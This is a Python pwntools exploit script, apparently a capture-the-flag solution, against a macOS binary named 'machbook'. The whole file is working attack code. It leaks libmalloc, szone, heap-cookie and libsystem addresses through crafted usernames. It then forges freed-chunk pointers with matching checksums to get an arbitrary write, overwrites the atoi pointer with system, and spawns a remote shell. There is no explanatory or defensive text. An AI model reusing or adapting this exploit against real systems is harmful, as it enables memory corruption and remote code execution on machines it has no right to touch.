#!/usr/bin/env python

import sys
from pwn import *

if len(sys.argv) == 1:
    r = process('./machbook')
else:
    r = remote(sys.argv[1], sys.argv[2])

def login(usr, pwd):
    r.sendlineafter('Choice: ', '1')
    if len(usr) == 40:
        r.sendafter('Username: ', usr)
        sleep(0.1)
    else:
        r.sendlineafter('Username: ', usr)
    r.sendlineafter('Password: ', pwd)

def register(usr, pwd):
    r.sendlineafter('Choice: ', '2')
    if len(usr) == 40:
        r.sendafter('Username: ', usr)
        sleep(0.1)
    else:
        r.sendlineafter('Username: ', usr)
    r.sendlineafter('Password: ', pwd)

def post(data):
    r.sendlineafter('Choice: ', '1')
    r.sendlineafter('Post: ', data)

def show(idx):
    r.sendlineafter('Choice: ', '2')
    r.sendlineafter('Index: ', str(idx))

def delete(idx):
    r.sendlineafter('Choice: ', '3')
    r.sendlineafter('Index: ', str(idx))

def editName(name):
    r.sendlineafter('Choice: ', '4')
    if len(name) == 40:
        r.sendafter('username: ', name)
        sleep(0.1)
    else:
        r.sendlineafter('username: ', name)

def editPwd(pwd):
    r.sendlineafter('Choice: ', '5')
    r.sendlineafter('password: ', pwd)

def logout():
    r.sendlineafter('Choice: ', '6')

def checksum(n):
    cs = 0
    for i in range(8):
        cs += (n >> (8*i)) & 0xff
    return cs & 0xff

def leak(ptr, size, cksum='a'):
    data = ''

    for i in range(size):
        editName(cksum + '\x00'*7 + '\\'*8 + '\x00'*16 + p64(ptr+i))
        show(0)
        r.recvuntil('Content: ')
        tmp = r.recvline().strip()
        if tmp == '':
            data += '\x00'
        else:
            data += tmp
        if len(data) >= size:
            break

    return u64(data[:size].ljust(8, '\x00'))

register('a', 'a'*8)
register('b', 'b'*8)
login('a', 'a'*8)
post('a')

# leak libmalloc
editName('a' + '\x00'*7 + '\\'*3 + '\x00'*26 + '\x28\x00\x00')
show(0)
r.recvuntil('Content: ')
libmalloc = u64(r.recvline()[:-1].ljust(8, '\x00')) + 0x44b5d0
log.success('libmalloc: ' + hex(libmalloc))

# leak szone
szonePtr = libmalloc + 0x22e8
szone = leak(szonePtr, 5)
log.success('szone: ' + hex(szone))

small_rack = szone + 0x1380
code = szone - 0x6000
user_ptr = code + 0x20b0
log.success('user_ptr: ' + hex(user_ptr))

# leak small cookie
editName('a' + '\x00'*7 + '\\'*8 + '\x00'*16 + p64(szone+0x15f8))
show(0)
r.recvuntil('Content: ')
small_cookie = u64(r.recv(8).strip())
log.success('small_cookie: ' + hex(small_cookie))

# leak libsystem
atoi_ptr = user_ptr - 0x60
editName('a' + '\x00'*7 + '\\'*8 + '\x00'*16 + p64(atoi_ptr))
show(0)
r.recvuntil('Content: ')
atoi = u64(r.recvline().strip().ljust(8, '\x00'))
libsystem = atoi - 0x5c4a7
log.success('libsystem: ' + hex(libsystem))
system = libsystem + 0x7aa0a
log.success('system: ' + hex(system))

# leak small heap (which is the first user password_ptr)
small_heap = leak(user_ptr, 6)
log.success('small_heap: ' + hex(small_heap))

# find 2nd free in same region
while True:
    post('C'*8)
    heap2 = leak(user_ptr+0x38, 6)
    log.success('heap2: ' + hex(heap2))
    if (heap2 & 0xffffffff0000) == (small_heap & 0xffffffff0000):
        break
    editName('a' + '\x00'*7 + '\\'*16 + p64(user_ptr+0x38) + p64(0))

# free password and another chunk in same region
editName('a' + '\x00'*7 + '\\'*8 + '\x00'*16 + p64(small_heap))
delete(0) # password
delete(1) # random chunk in same region

# update prev & next + checksums
t_prev = user_ptr - 0x10
t_next = user_ptr + 0x48

cksum1 = checksum(small_cookie ^ small_rack ^ t_prev)
cksum2 = checksum(small_cookie ^ small_rack ^ t_next)
editPwd(p64(t_prev) + p64(cksum1) + p64(t_next) + p64(cksum2))

cksum1 = checksum(small_cookie ^ small_rack ^ small_heap)
editName('\\'*36 + p64(cksum1)[0])
editName('\\'*32 + p64(small_heap)[:-1])
editName(p64(cksum1))

# check if unlink is successful
editName(chr(cksum1) + '\x00'*7 + '\\'*16 + p64(user_ptr+0x38) + p64(0))
while True:
    post('D'*8)
    heap3 = leak(user_ptr, 5, chr(cksum1))
    log.success('heap3: ' + hex(heap3))
    if heap3 != (small_heap & 0xffffffffff):
        break
    editName(chr(cksum1) + '\x00'*7 + '\\'*16 + p64(user_ptr+0x38) + p64(0))

# overwrite second user password_ptr
editPwd('A'*32 + p64(atoi_ptr)[:-1])

# overwrite atoi_ptr to one_gadget
logout()
login('b', p64(atoi))
editPwd(p64(system))

# get shell
r.sendlineafter('Choice: ', '/bin/sh\x00')

r.interactive()
